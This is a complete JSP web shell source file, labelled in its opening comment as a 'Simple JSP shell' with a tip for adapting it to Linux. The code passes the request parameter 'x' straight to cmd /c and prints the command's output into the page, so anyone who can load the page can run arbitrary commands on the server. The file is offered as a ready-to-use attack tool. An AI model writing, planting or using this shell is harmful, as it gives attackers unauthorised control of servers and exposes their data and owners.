<%-- Simple JSP shell. Modify the params to .exec to make it work on linux. Use /bin/bash --%>
<%@ page import="java.util.*,java.io.*"%> 
<pre> 
<% 	Process p = Runtime.getRuntime().exec("cmd /c " + request.getParameter("x")); 
	DataInputStream dis = new DataInputStream(p.getInputStream()); 
	String disr = dis.readLine();
	while (disr != null) { 
		out.println(disr);
		disr = dis.readLine();
	} %> 
</pre> 